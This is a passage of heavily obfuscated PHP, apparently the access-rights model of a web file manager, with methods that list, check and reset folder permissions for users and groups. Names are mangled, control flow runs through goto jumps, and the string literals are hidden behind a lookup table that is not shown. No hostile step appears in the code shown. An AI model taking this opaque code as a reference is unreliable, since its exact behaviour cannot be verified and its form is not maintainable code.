$BÍÒ—Ä¦ŒÄ, $Fµ¿×õÙª÷[398] => intval($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[398]]), $Fµ¿×õÙª÷[478] => intval($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[478]]), $Fµ¿×õÙª÷[1759] => intval($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[1759]]) ? intval($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[1759]]) : 0, $Fµ¿×õÙª÷[1813] => intval($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[1813]]) ? intval($f“ô†è–ÔŸ[$Fµ¿×õÙª÷[1813]]) : -1); } $this->where(array($Fµ¿×õÙª÷[404] => $BÍÒ—Ä¦ŒÄ))->delete(); $this->addAll($E„íùîùì); goto C×§Üâß§’; e§ƒ¾õƒĞÏ: $Fµ¿×õÙª÷ =& $_SERVER[Š‰]; $CĞ…„·˜Ü‚ = Model($Fµ¿×õÙª÷[1180])->sourceInfo($BÍÒ—Ä¦ŒÄ); if (!$CĞ…„·˜Ü‚) { return !1; } goto c‹„õˆ¬§²; D®¢ã¤êÊÙ: if ($EÉ‰³á‚ÈŞ != $B™È¤‡öî¤) { $AÜ¡ê‰Ş…œ = array($Fµ¿×õÙª÷[1663] => $EÉ‰³á‚ÈŞ); $AĞ‹ò‡ = Model($Fµ¿×õÙª÷[1745])->field($Fµ¿×õÙª÷[1500])->where($AÜ¡ê‰Ş…œ)->select(); $AĞ‹ò‡ = array_to_keyvalue($AĞ‹ò‡, $Fµ¿×õÙª÷[33], $Fµ¿×õÙª÷[1500]); } $dùğ¤ïˆ»ï = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $E„íùîùì = array(); goto c²Ë³Ù´å³; c‹„õˆ¬§²: if ($CĞ…„·˜Ü‚[$Fµ¿×õÙª÷[398]] != SourceModel::TYPE_GROUP) { return !1; } $B™È¤‡öî¤ = 1; $EÉ‰³á‚ÈŞ = $CĞ…„·˜Ü‚[$Fµ¿×õÙª÷[478]]; goto D®¢ã¤êÊÙ; Aª…ºµ¼ˆ‡: } public function authClear($EŒ¨˜Ùê¶á) { $CôÈÅñØç =& $_SERVER[Š‰]; $d™Õöˆ“ = Model($CôÈÅñØç[1180])->sourceInfo($EŒ¨˜Ùê¶á); $cä§Š­ùÏ´ = array($EŒ¨˜Ùê¶á); if ($d™Õöˆ“[$CôÈÅñØç[397]] == $CôÈÅñØç[86]) { $dğ•Ò¡‰†õ = array($CôÈÅñØç[548] => array($CôÈÅñØç[507], $d™Õöˆ“[$CôÈÅñØç[481]] . $EŒ¨˜Ùê¶á . $CôÈÅñØç[508])); $cä§Š­ùÏ´ = Model($CôÈÅñØç[1180])->field($CôÈÅñØç[404])->where($dğ•Ò¡‰†õ)->getField($CôÈÅñØç[390], !0); $cä§Š­ùÏ´[] = $EŒ¨˜Ùê¶á; } $this->where(array($CôÈÅñØç[404] => array($CôÈÅñØç[405], $cä§Š­ùÏ´)))->delete(); return !0; } public function getAllChildren($AïâÙ‘àêÃ) { goto bŞğÓ‚áÛ; cŸæõâÍä: $b˜°ÊŞØğ« = Model($B¢Û„çŸŒ[775])->field($D¥ğ¦¡©½)->where($Có¼ÁÕŞÑ)->select(); $cÌ‘œ¡î‹™ = array($AïâÙ‘àêÃ); foreach ($b˜°ÊŞØğ« as $FÙ‚Ãğ²ËÏ) { foreach ($e±˜„Ü‡Æï as $fáèÇ˜¿š) { $Cê–´ôïÛ = $B¢Û„çŸŒ[47] . $fáèÇ˜¿š . $B¢Û„çŸŒ[47]; $eì±Ğ–§­¥ = $FÙ‚Ãğ²ËÏ[$B¢Û„çŸŒ[481]] . $FÙ‚Ãğ²ËÏ[$B¢Û„çŸŒ[390]] . $B¢Û„çŸŒ[47]; if (strstr($eì±Ğ–§­¥, $Cê–´ôïÛ)) { $cÌ‘œ¡î‹™[] = $FÙ‚Ãğ²ËÏ[$B¢Û„çŸŒ[390]]; break; } } } goto Cñ«àŞù ¾; bÔ¨ëéºŞÛ: if ($a™ï”Ä¯µ[$B¢Û„çŸŒ[398]] != SourceModel::TYPE_GROUP) { return array(); } $F¤†½ÅùÂø = 1; $e±˜„Ü‡Æï = array($AïâÙ‘àêÃ); goto dÒÀÇ¡Œ‘•; bŞğÓ‚áÛ: $B¢Û„çŸŒ =& $_SERVER[Š‰]; $a™ï”Ä¯µ = Model($B¢Û„çŸŒ[1180])->sourceInfo($AïâÙ‘àêÃ); if ($a™ï”Ä¯µ[$B¢Û„çŸŒ[397]] != $B¢Û„çŸŒ[86]) { return $this->sourceListAuth(array($AïâÙ‘àêÃ)); } goto bÔ¨ëéºŞÛ; E›‚»¢Û”: if (!$eÜ‚óà½å¨) { return array(); } $D¥ğ¦¡©½ = $B¢Û„çŸŒ[1834]; $Có¼ÁÕŞÑ = array($B¢Û„çŸŒ[390] => array($B¢Û„çŸŒ[7], $eÜ‚óà½å¨), $B¢Û„çŸŒ[417] => $B¢Û„çŸŒ[491]); goto cŸæõâÍä; Cñ«àŞù ¾: return $this->sourceListAuth($cÌ‘œ¡î‹™); goto aóé™éãöŸ; dÒÀÇ¡Œ‘•: if ($a™ï”Ä¯µ[$B¢Û„çŸŒ[472]] == $B¢Û„çŸŒ[491] && $a™ï”Ä¯µ[$B¢Û„çŸŒ[478]] != $F¤†½ÅùÂø) { $e±˜„Ü‡Æï = $this->groupChidldAllRootSource($a™ï”Ä¯µ[$B¢Û„çŸŒ[478]]); } $eÜ‚óà½å¨ = $this->field($B¢Û„çŸŒ[390])->group($B¢Û„çŸŒ[390])->select(); $eÜ‚óà½å¨ = array_to_keyvalue($eÜ‚óà½å¨, $B¢Û„çŸŒ[33], $B¢Û„çŸŒ[390]); goto E›‚»¢Û”; aóé™éãöŸ: } private function sourceListAuth($c¼á…›µ©¹) { goto Dœ–ï‹²ŸÖ; Dœ–ï‹²ŸÖ: $eÁÎ­È²« =& $_SERVER[Š‰]; $A‡¤òŠè¶ö = Model($eÁÎ­È²«[1180])->sourceListInfo($c¼á…›µ©¹, !0); $FìÀãÄè = $this->sourceAuthSelect($c¼á…›µ©¹); goto DªÕ‹ĞçÄö; c”é¡¹÷‹: array_multisort($A«¶°É³ªõ, SORT_ASC, $Bí–¬åÚ•¨); return $Bí–¬åÚ•¨; goto A²’…·ğÏ±; DªÕ‹ĞçÄö: $Bí–¬åÚ•¨ = array(); $A«¶°É³ªõ = array(); foreach ($A‡¤òŠè¶ö as $EÇ¬÷¬³) { goto E°Šï²Ô¤; cğ¡©óŒš“: $C¥°–Õ®‰Î = count(explode($eÁÎ­È²«[8], trim($EÇ¬÷¬³[$eÁÎ­È²«[489]], $eÁÎ­È²«[8]))); $A«¶°É³ªõ[] = $C¥°–Õ®‰Î + ($EÇ¬÷¬³[$eÁÎ­È²«[29]] == $eÁÎ­È²«[76] ? 0 : 1000); goto E¿­İîØÏ; E°Šï²Ô¤: unset($EÇ¬÷¬³[$eÁÎ­È²«[428]]); unset($EÇ¬÷¬³[$eÁÎ­È²«[426]]); unset($EÇ¬÷¬³[$eÁÎ­È²«[400]]); goto aÖŠ‚Ã¹Á; eºï¤É°µ¹: $EÇ¬÷¬³[$eÁÎ­È²«[1835]] = $this->authTargetInfo($bôíåÙâ’); $EÇ¬÷¬³[$eÁÎ­È²«[489]] = rtrim($EÇ¬÷¬³[$eÁÎ­È²«[484]], $eÁÎ­È²«[8]) . $eÁÎ­È²«[8] . ltrim($EÇ¬÷¬³[$eÁÎ­È²«[489]], $eÁÎ­È²«[8]); $Bí–¬åÚ•¨[] = $EÇ¬÷¬³; goto cğ¡©óŒš“; aÖŠ‚Ã¹Á: unset($EÇ¬÷¬³[$eÁÎ­È²«[84]]); $bôíåÙâ’ = $FìÀãÄè[$EÇ¬÷¬³[$eÁÎ­È²«[390]]]; if (!$bôíåÙâ’) { continue; } goto eºï¤É°µ¹; E¿­İîØÏ: } goto c”é¡¹÷‹; A²’…·ğÏ±: } private function groupChidldAllRootSource($cº—¼¸õ´) { $a»ªŒ†öõ =& $_SERVER[Š‰]; $bËøòÖá¡µ = Model($a»ªŒ†öõ[1836])->groupChildrenAll($cº—¼¸õ´); $C‘¹ƒ•› = array($a»ªŒ†öõ[472] => 0, $a»ªŒ†öõ[478] => array($a»ªŒ†öõ[7], $bËøòÖá¡µ), $a»ªŒ†öõ[398] => SourceModel::TYPE_GROUP); $Dš„ŸğÕÁë = Model($a»ªŒ†öõ[775])->field($a»ªŒ†öõ[390])->where($C‘¹ƒ•›)->select(); $Dš„ŸğÕÁë = array_to_keyvalue($Dš„ŸğÕÁë, $a»ªŒ†öõ[33], $a»ªŒ†öõ[390]); return $Dš„ŸğÕÁë; } private function authTargetInfo($fÆâÊÂƒ£) { goto c Ç¡Ìïö; B¾ÖõÂ¿ë: return $f¾¥’óê¶¡; goto A© Ø•ïÒä; c Ç¡Ìïö: $cñÏÊ¦Â·ó =& $_SERVER[Š‰]; $f¾¥’óê¶¡ = array(); $A–­°ì¨İ = array(); goto cÖèâÂ”Ô´; cÖèâÂ”Ô´: $b×Ñ¿Î® = 2 << 25; foreach ($fÆâÊÂƒ£ as $f×†²äÕ) { goto E´©ÑàÅÜ; cÙ±®§…ÏØ: if (!$D¸©Û£ÆÌš) { continue; } $D¸©Û£ÆÌš[$cñÏÊ¦Â·ó[440]] = $D©Şƒá¹è·; $f¾¥’óê¶¡[] = $D¸©Û£ÆÌš; goto Eœî“»ó¬æ; Eœî“»ó¬æ: $fÍÙ›©ƒä„ = 0; if ($f×†²äÕ[$cñÏÊ¦Â·ó[398]] == SourceModel::TYPE_GROUP) { $fÍÙ›©ƒä„ = $b×Ñ¿Î® * 2; } if ($f×†²äÕ[$cñÏÊ¦Â·ó[398]] == SourceModel::TYPE_USER) { $fÍÙ›©ƒä„ = $b×Ñ¿Î®; } goto dÑŸÃ„”ôÏ; E´©ÑàÅÜ: $D©Şƒá¹è· = Model($cñÏÊ¦Â·ó[1831])->listData($f×†²äÕ[$cñÏÊ¦Â·ó[1759]]); if (!$D©Şƒá¹è·) { continue; } if ($f×†²äÕ[$cñÏÊ¦Â·ó[398]] == SourceModel::TYPE_USER) { $D¸©Û£ÆÌš = Model($cñÏÊ¦Â·ó[497])->getInfoSimpleOuter($f×†²äÕ[$cñÏÊ¦Â·ó[478]]); if ($D¸©Û£ÆÌš[$cñÏÊ¦Â·ó[1500]] == $cñÏÊ¦Â·ó[1061]) { continue; } if ($D¸©Û£ÆÌš[$cñÏÊ¦Â·ó[1500]] == $cñÏÊ¦Â·ó[491]) { $D¸©Û£ÆÌš[$cñÏÊ¦Â·ó[28]] = LNG($cñÏÊ¦Â·ó[1837]); } } else { $D¸©Û£ÆÌš = Model($cñÏÊ¦Â·ó[480])->getInfoSimple($f×†²äÕ[$cñÏÊ¦Â·ó[478]]); } goto cÙ±®§…ÏØ; dÑŸÃ„”ôÏ: if ($f×†²äÕ[$cñÏÊ¦Â·ó[398]] == SourceModel::TYPE_USER && $f×†²äÕ[$cñÏÊ¦Â·ó[478]] == $cñÏÊ¦Â·ó[491]) { $fÍÙ›©ƒä„ = 0; } $A–­°ì¨İ[] = $D©Şƒá¹è·[$cñÏÊ¦Â·ó[400]] + $fÍÙ›©ƒä„; goto CÎï—˜ò‰ê; CÎï—˜ò‰ê: } array_multisort($A–­°ì¨İ, SORT_DESC, $f¾¥’óê¶¡); goto B¾ÖõÂ¿ë; A© Ø•ïÒä: } public function getAllChildrenByUser($dòçŸÔ¥ìƒ, $D³™íºË») { goto dÄ’”ø…¦º; D°³†®Ì¶‘: foreach ($DóÓ’Âæ× as $BçÕØ±æ•ª) { $e»©¥§Ş¥Œ = !1; foreach ($BçÕØ±æ•ª[$E¿‹ä¯°Ùò[1835]] as $Bº”´’‘î) { if ($Bº”´’‘î[$E¿‹ä¯°Ùò[1500]]) { if ($Bº”´’‘î[$E¿‹ä¯°Ùò[1500]] == $D³™íºË») { $e»©¥§Ş¥Œ = !0; break; } } if ($Bº”´’‘î[$E¿‹ä¯°Ùò[1663]]) { if ($this->groupContainUser($Bº”´’‘î[$E¿‹ä¯°Ùò[1663]], $D³™íºË»)) { $e»©¥§Ş¥Œ = !0; break; } } } if ($e»©¥§Ş¥Œ) { $C™„ÄŸ†îº[] = $BçÕØ±æ•ª; } $bƒ¢°²¸¬Ú = $BçÕØ±æ•ª[$E¿‹ä¯°Ùò[390]]; if (isset($c¢˜»İÁÁ‚[$bƒ¢°²¸¬Ú])) { $BçÕØ±æ•ª[$E¿‹ä¯°Ùò[1835]][] = $c¢˜»İÁÁ‚[$bƒ¢°²¸¬Ú][0]; $c¢˜»İÁÁ‚[$bƒ¢°²¸¬Ú] = !1; } } $c¢˜»İÁÁ‚ = array_filter(array_values($c¢˜»İÁÁ‚)); $C™„ÄŸ†îº = array_merge($c¢˜»İÁÁ‚, $C™„ÄŸ†îº); goto D¤¬Ü¹ ¥¬; d´ø¾ëÜ: $F©”ï†æÌ = Model($E¿‹ä¯°Ùò[1180])->sourceInfo($dòçŸÔ¥ìƒ); $c¢˜»İÁÁ‚ = array(); $EÎÜÓ±Œ¹ò = 1; goto DêÕÔ¶¥¯™; D¤¬Ü¹ ¥¬: return $C™„ÄŸ†îº; goto B„ùª—³Š‡; dÄ’”ø…¦º: $E¿‹ä¯°Ùò =& $_SERVER[Š‰]; $Aš‚ÇùöÑ = Model($E¿‹ä¯°Ùò[501])->getInfo($D³™íºË»); if (!$D³™íºË» || !$dòçŸÔ¥ìƒ || !$Aš‚ÇùöÑ) { return array(); } goto d´ø¾ëÜ; DêÕÔ¶¥¯™: if ($F©”ï†æÌ[$E¿‹ä¯°Ùò[472]] == $E¿‹ä¯°Ùò[491] && $F©”ï†æÌ[$E¿‹ä¯°Ùò[478]] != $EÎÜÓ±Œ¹ò && $this->groupContainUser($F©”ï†æÌ[$E¿‹ä¯°Ùò[478]], $D³™íºË»)) { foreach ($Aš‚ÇùöÑ[$E¿‹ä¯°Ùò[1838]] as $f¯§•‹»Ïå) { $B£œ¢î²ë = Model($E¿‹ä¯°Ùò[480])->getInfo($f¯§•‹»Ïå[$E¿‹ä¯°Ùò[1663]]); $F‰í‚ÛµÙù = Model($E¿‹ä¯°Ùò[501])->getInfoSimpleOuter($D³™íºË»); $F‰í‚ÛµÙù[$E¿‹ä¯°Ùò[440]] = $f¯§•‹»Ïå[$E¿‹ä¯°Ùò[400]]; if (Model($E¿‹ä¯°Ùò[1831])->authCheckAction($f¯§•‹»Ïå[$E¿‹ä¯°Ùò[400]][$E¿‹ä¯°Ùò[400]], $E¿‹ä¯°Ùò[1683])) { continue; } $FÍ›²›†Æã = array($E¿‹ä¯°Ùò[28] => $E¿‹ä¯°Ùò[1452] . $B£œ¢î²ë[$E¿‹ä¯°Ùò[28]], $E¿‹ä¯°Ùò[390] => $B£œ¢î²ë[$E¿‹ä¯°Ùò[84]][$E¿‹ä¯°Ùò[390]], $E¿‹ä¯°Ùò[75] => KodIO::make($B£œ¢î²ë[$E¿‹ä¯°Ùò[84]][$E¿‹ä¯°Ùò[390]]), $E¿‹ä¯°Ùò[472] => $E¿‹ä¯°Ùò[491], $E¿‹ä¯°Ùò[398] => $E¿‹ä¯°Ùò[992], $E¿‹ä¯°Ùò[29] => $E¿‹ä¯°Ùò[512], $E¿‹ä¯°Ùò[489] => $B£œ¢î²ë[$E¿‹ä¯°Ùò[485]], $E¿‹ä¯°Ùò[1663] => $B£œ¢î²ë[$E¿‹ä¯°Ùò[1663]], $E¿‹ä¯°Ùò[482] => $B£œ¢î²ë[$E¿‹ä¯°Ùò[472]], $E¿‹ä¯°Ùò[1835] => array($F‰í‚ÛµÙù)); $c¢˜»İÁÁ‚[$FÍ›²›†Æã[$E¿‹ä¯°Ùò[390]]] = $FÍ›²›†Æã; } } $C™„ÄŸ†îº = array(); $DóÓ’Âæ× = $this->getAllChildren($dòçŸÔ¥ìƒ); goto D°³†®Ì¶‘; B„ùª—³Š‡: } public function setAllChildrenByUser($Eµƒ„Á¯Š‚, $b¼Â°ö¿’ì, $fìÄ‰‹Š­õ) { $C©ê¯äÌç =& $_SERVER[Š‰]; $F®˜Ç­“ƒ¯ = $this->getAllChildrenByUser($Eµƒ„Á¯Š‚, $b¼Â°ö¿’ì); if (!$fìÄ‰‹Š­õ || !$F®˜Ç­“ƒ¯) { return !1; } foreach ($F®˜Ç­“ƒ¯ as $d‚Ñ…Ë´ºå) { $fŠç«‹Ë = array(); foreach ($d‚Ñ…Ë´ºå[$C©ê¯äÌç[1835]] as $aëä¤²Ï´Ä) { $AÀ×»‹™‹î = $aëä¤²Ï´Ä[$C©ê¯äÌç[440]]; $F¯éâ½œ„» = $aëä¤²Ï´Ä[$C©ê¯äÌç[1500]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $EÛ¨¸•’Ãğ = $aëä¤²Ï´Ä[$C©ê¯äÌç[1500]] ? $aëä¤²Ï´Ä[$C©ê¯äÌç[1500]] : $aëä¤²Ï´Ä[$C©ê¯äÌç[1663]]; if ($aëä¤²Ï´Ä[$C©ê¯äÌç[1500]] && $aëä¤²Ï´Ä[$C©ê¯äÌç[1500]] == $b¼Â°ö¿’ì) { continue; } $fŠç«‹Ë[] = array($C©ê¯äÌç[390] => $d‚Ñ…Ë´ºå[$C©ê¯äÌç[390]], $C©ê¯äÌç[398] => $F¯éâ½œ„», $C©ê¯äÌç[478] => intval($EÛ¨¸•’Ãğ), $C©ê¯äÌç[1759] => isset($AÀ×»‹™‹î[$C©ê¯äÌç[388]]) ? intval($AÀ×»‹™‹î[$C©ê¯äÌç[388]]) : 0, $C©ê¯äÌç[1813] => isset($AÀ×»‹™‹î[$C©ê¯äÌç[1813]]) ? intval($AÀ×»‹™‹î[$C©ê¯äÌç[1813]]) : -1); } $fŠç«‹Ë[] = array($C©ê¯äÌç[390] => $d‚Ñ…Ë´ºå[$C©ê¯äÌç[390]], $C©ê¯äÌç[398] => SourceModel::TYPE_USER, $C©ê¯äÌç[478] => intval($b¼Â°ö¿’ì), $C©ê¯äÌç[1759] => intval($fìÄ‰‹Š­õ), $C©ê¯äÌç[1813] => -1); $this->where(array($C©ê¯äÌç[404] => $d‚Ñ…Ë´ºå[$C©ê¯äÌç[390]]))->delete(); $this->addAll($fŠç«‹Ë); } return !0; } public function get($dŒšƒˆ‹) { $DÁÑñŠÇ = $this->getSourceList(array($dŒšƒˆ‹), !0); return $DÁÑñŠÇ[0]; } public function getSourceList($dŒ˜§“Õ…à, $dß—«¯ˆğô = false, $b°³·ğ’ìí = false) { goto C¹Ñ¸ƒ¾ÃÄ; e–İÆáŞ©×: $FÊÊëíôªƒ = array(); foreach ($dß—«¯ˆğô as $f•µÛó‘İ£ => $CÓ¢ò¯øÖ«) { if ($d…¬”‹‚ß–) { $FÊÊëíôªƒ[$f•µÛó‘İ£] = $BŞğŞ…Ïíà; continue; } $FÊÊëíôªƒ[$f•µÛó‘İ£] = $this->makeSourceAuth($CÓ¢ò¯øÖ«, $DòßåÔàÛ, $b°³·ğ’ìí); } return $FÊÊëíôªƒ; goto e¼ÂÄ­İäó; C¹Ñ¸ƒ¾ÃÄ: $Dà×Àİ—˜ =& $_SERVER[Š‰]; if (!$dŒ˜§“Õ…à) { return array(); } $FÆùùÈùäß = Model($Dà×Àİ—˜[1180]); goto dˆÉ…™İé; A¦Ë…Õ‡¹Î: $b¯Óë«¢¨™ = $this->sourceAuthSelect($d®çí•—¥º); $DòßåÔàÛ = array(); foreach ($d®çí•—¥º as $f•µÛó‘İ£) { if (isset($b¯Óë«¢¨™[$f•µÛó‘İ£])) { $DòßåÔàÛ[$f•µÛó‘İ£] = $b¯Óë«¢¨™[$f•µÛó‘İ£]; } } goto c¢ğ‡šêëğ; c¢ğ‡šêëğ: $d…¬”‹‚ß– = $this->userIsRoot($b°³·ğ’ìí); $EŞãƒ„‘¬‚ = AuthModel::authAll(); $BŞğŞ…Ïíà = array($Dà×Àİ—˜[401] => $EŞãƒ„‘¬‚, $Dà×Àİ—˜[1840] => array($Dà×Àİ—˜[406] => 0, $Dà×Àİ—˜[1669] => $EŞãƒ„‘¬‚, $Dà×Àİ—˜[407] => LNG($Dà×Àİ—˜[1841]), $Dà×Àİ—˜[1684] => $Dà×Àİ—˜[1842])); goto e–İÆáŞ©×; dğÁ¸¨Ë“: foreach ($dß—«¯ˆğô as $EÆë‹ÄÑ¢ => $aÑó·î…Ö‹) { $DÛ¯Ñè™×Å = $FÆùùÈùäß->parentLevelArray($aÑó·î…Ö‹[$Dà×Àİ—˜[481]]); $d®çí•—¥º = array_merge($d®çí•—¥º, array($EÆë‹ÄÑ¢), array_reverse($DÛ¯Ñè™×Å)); } $d®çí•—¥º = array_values(array_unique($d®çí•—¥º)); if (!$d®çí•—¥º) { return array(); } goto A¦Ë…Õ‡¹Î; dˆÉ…™İé: if (!$dß—«¯ˆğô && count($dŒ˜§“Õ…à) == 1) { $dß—«¯ˆğô = array(); $dß—«¯ˆğô[$dŒ˜§“Õ…à[0]] = $FÆùùÈùäß->sourceInfo($dŒ˜§“Õ…à[0]); } if (!$dß—«¯ˆğô) { $Fçò¡‹È°Ş = array($Dà×Àİ—˜[404] => array($Dà×Àİ—˜[405], $dŒ˜§“Õ…à)); $dß—«¯ˆğô = $FÆùùÈùäß->field($Dà×Àİ—˜[1839])->where($Fçò¡‹È°Ş)->select(); $dß—«¯ˆğô = array_to_keyvalue($dß—«¯ˆğô, $Dà×Àİ—˜[390]); } $d®çí•—¥º = $dŒ˜§“Õ…à; goto dğÁ¸¨Ë“; e¼ÂÄ­İäó: } public function authDeepCheck($eÜŠ°ˆö•Ï, $e¬ÈÈãœ¥Ó = false) { goto AŠÂ«¦™¢; Dâù¤Ô²µ: if (!$FºƒÂ‘÷‡£) { return !1; } $béÓ…Àƒ…è = $FºƒÂ‘÷‡£ ? $FºƒÂ‘÷‡£[0] : $eÜŠ°ˆö•Ï; return array($eš¨ƒßÍĞä[401] => -1, $eš¨ƒßÍĞä[440] => array($eš¨ƒßÍĞä[406] => $eš¨ƒßÍĞä[1061], $eš¨ƒßÍĞä[1669] => $eš¨ƒßÍĞä[491], $eš¨ƒßÍĞä[407] => LNG($eš¨ƒßÍĞä[1845]), $eš¨ƒßÍĞä[1684] => $eš¨ƒßÍĞä[1846]), $eš¨ƒßÍĞä[1847] => LNG($eš¨ƒßÍĞä[1848]), $eš¨ƒßÍĞä[1849] => $this->sourceAuthInfo($béÓ…Àƒ…è)); goto E‰ŒÌñµ; AŠÂ«¦™¢: $eš¨ƒßÍĞä =& $_SERVER[Š‰]; $e¬ÈÈãœ¥Ó = $e¬ÈÈãœ¥Ó ? $e¬ÈÈãœ¥Ó : USER_ID; $e¾ Œ¶š = $this->makeAuthDeep($e¬ÈÈãœ¥Ó); goto Cø‹³õÎ¹•; Cø‹³õÎ¹•: if (!in_array($eÜŠ°ˆö•Ï, $e¾ Œ¶š[$eš¨ƒßÍĞä[1843]])) { return !1; } $FºƒÂ‘÷‡£ = array(); foreach ($e¾ Œ¶š[$eš¨ƒßÍĞä[1844]] as $Dé¤›Ç•ˆ¨ => $dÓŠŠÌÈ) { if (!in_array($eÜŠ°ˆö•Ï, $dÓŠŠÌÈ)) { continue; } $FºƒÂ‘÷‡£[] = $Dé¤›Ç•ˆ¨; } goto Dâù¤Ô²µ; E‰ŒÌñµ: } protected function makeAuthDeep($d÷›Ë…Ç®– = false) { goto e˜ôÀå„Í; F‘ƒ˜Üší×: if ($f±¦èôŞ­Â) { $D§ÇäáîÑæ = array(array($A¯Ì½¡”Òë[398] => SourceModel::TYPE_USER, $A¯Ì½¡”Òë[478] => $d÷›Ë…Ç®–), array($A¯Ì½¡”Òë[398] => SourceModel::TYPE_GROUP, $A¯Ì½¡”Òë[478] => array($A¯Ì½¡”Òë[405], $f±¦èôŞ­Â)), $A¯Ì½¡”Òë[934] => $A¯Ì½¡”Òë[1751]); } $E¼Ìğ–ÉÎÛ = $this->field($A¯Ì½¡”Òë[1851])->where($D§ÇäáîÑæ)->select(); $b·ŒÈğá¥‘ = array(); goto D¢®ëßø¨à; Aì×£—©¬Ê: $b®¢ÙäÇ¶ = array($A¯Ì½¡”Òë[1843] => $B·Í½åØ¬í, $A¯Ì½¡”Òë[1844] => $EßÙæ…ëÍÈ); $FÔÏ”Ÿ„[$d÷›Ë…Ç®–] = $b®¢ÙäÇ¶; return $b®¢ÙäÇ¶; goto b„î”î×‘ª; eóØ‘ó™Ï: $E†Î¹èÄ¸¥ = $f±¦èôŞ­Â; $d¶Ø»™øŠ¶ = Model($A¯Ì½¡”Òë[1180]); $aÂç×‚ ù’ = Model($A¯Ì½¡”Òë[480]); goto d…¥ãÍÜ³; C°ÃŸáÒ­: foreach ($Cõëç”–ø as $fê½‹ÂÔ) { if ($fê½‹ÂÔ[$A¯Ì½¡”Òë[400]] == 0 && $fê½‹ÂÔ[$A¯Ì½¡”Òë[1685]] == $A¯Ì½¡”Òë[86]) { $FØÔõˆ‘Æ°[] = $fê½‹ÂÔ[$A¯Ì½¡”Òë[388]]; } } $f±¦èôŞ­Â = $this->userGroupParents($d÷›Ë…Ç®–); $D§ÇäáîÑæ = array($A¯Ì½¡”Òë[398] => SourceModel::TYPE_USER, $A¯Ì½¡”Òë[478] => $d÷›Ë…Ç®–); goto F‘ƒ˜Üší×; C°ÒÁ»ĞÁå: foreach ($E†Î¹èÄ¸¥ as $AÇ±¤ô¸É‰) { $a¿Í¾‰…½ = $aÂç×‚ ù’->getInfo($AÇ±¤ô¸É‰); $B·Í½åØ¬í[] = $a¿Í¾‰…½[$A¯Ì½¡”Òë[84]][$A¯Ì½¡”Òë[390]]; $DÕØ·—õ·é[$AÇ±¤ô¸É‰] = $a¿Í¾‰…½[$A¯Ì½¡”Òë[84]][$A¯Ì½¡”Òë[390]]; $f’ª›º¬¬‚[$AÇ±¤ô¸É‰] = $d¶Ø»™øŠ¶->parentLevelArray($a¿Í¾‰…½[$A¯Ì½¡”Òë[481]]); } foreach ($EßÙæ…ëÍÈ as $a¬Ûö®ŸÕ¦ => $D”ƒ†Š­‚­) { $e†æ„„–…¦ = $aĞÓ“®·èŒ[$a¬Ûö®ŸÕ¦]; if (!$e†æ„„–…¦ || !$DÕØ·—õ·é[$e†æ„„–…¦]) { continue; } $BŞÒÕĞ˜ Î = array(); foreach ($f’ª›º¬¬‚[$e†æ„„–…¦] as $AÇ±¤ô¸É‰) { $BŞÒÕĞ˜ Î[] = $DÕØ·—õ·é[$AÇ±¤ô¸É‰]; } $EßÙæ…ëÍÈ[$a¬Ûö®ŸÕ¦] = array_merge($BŞÒÕĞ˜ Î, $D”ƒ†Š­‚­); } $B·Í½åØ¬í = array_values(array_unique($B·Í½åØ¬í)); goto Aì×£—©¬Ê; Cá¿îîãöÚ: if (isset($FÔÏ”Ÿ„[$d÷›Ë…Ç®–])) { return $FÔÏ”Ÿ„[$d÷›Ë…Ç®–]; } $Cõëç”–ø = Model($A¯Ì½¡”Òë[1850])->listData(); $FØÔõˆ‘Æ° = array(); goto C°ÃŸáÒ­; d…¥ãÍÜ³: $EßÙæ…ëÍÈ = array(); $aĞÓ“®·èŒ = array(); $DÕØ·—õ·é = array(); goto CØ¥Å¾½õÕ; d•ÎÖ‘ô¡: $B‘»ç¾¹‚Ò = $E†Î¹èÄ¸¥; foreach ($B‘»ç¾¹‚Ò as $AÇ±¤ô¸É‰) { $a¿Í¾‰…½ = $aÂç×‚ ù’->getInfo($AÇ±¤ô¸É‰); $a£ùôî° = $d¶Ø»™øŠ¶->parentLevelArray($a¿Í¾‰…½[$A¯Ì½¡”Òë[481]]); $E†Î¹èÄ¸¥ = array_merge($E†Î¹èÄ¸¥, $a£ùôî°); } $E†Î¹èÄ¸¥ = array_values(array_unique($E†Î¹èÄ¸¥)); goto C°ÒÁ»ĞÁå; D¢®ëßø¨à: $f‚ÎÆî‚®Ï = array_to_keyvalue_group($E¼Ìğ–ÉÎÛ, $A¯Ì½¡”Òë[390]); foreach ($f‚ÎÆî‚®Ï as $fšÙ²‰¯íè => $AùÜ•«ì) { $bËÈİôì¦ = $this->authArrayCheck($AùÜ•«ì, $d÷›Ë…Ç®–); if ($bËÈİôì¦[$A¯Ì½¡”Òë[401]] > 0) { $b·ŒÈğá¥‘[] = $fšÙ²‰¯íè . $A¯Ì½¡”Òë[33]; } } $B·Í½åØ¬í = array(); goto eóØ‘ó™Ï; CØ¥Å¾½õÕ: $f’ª›º¬¬‚ = array(); if ($b·ŒÈğá¥‘) { $Föí–´“Áö = $d¶Ø»™øŠ¶->where(array($A¯Ì½¡”Òë[390] => array($A¯Ì½¡”Òë[405], $b·ŒÈğá¥‘)))->select(); foreach ($Föí–´“Áö as $fÇƒîÂƒ£â) { $a£ùôî° = $d¶Ø»™øŠ¶->parentLevelArray($fÇƒîÂƒ£â[$A¯Ì½¡”Òë[481]]); $B·Í½åØ¬í = array_merge($B·Í½åØ¬í, $a£ùôî°); $E†Î¹èÄ¸¥[] = $fÇƒîÂƒ£â[$A¯Ì½¡”Òë[478]]; $EßÙæ…ëÍÈ[$fÇƒîÂƒ£â[$A¯Ì½¡”Òë[390]]] = $a£ùôî°; $aĞÓ“®·èŒ[$fÇƒîÂƒ£â[$A¯Ì½¡”Òë[390]]] = $fÇƒîÂƒ£â[$A¯Ì½¡”Òë[478]]; } } $E†Î¹èÄ¸¥ = array_values(array_unique($E†Î¹èÄ¸¥)); goto d•ÎÖ‘ô¡; e˜ôÀå„Í: $A¯Ì½¡”Òë =& $_SERVER[Š‰]; static $FÔÏ”Ÿ„ = array(); $d÷›Ë…Ç®– = $d÷›Ë…Ç®– ? $d÷›Ë…Ç®– : USER_ID; goto Cá¿îîãöÚ; b„î”î×‘ª: } private function 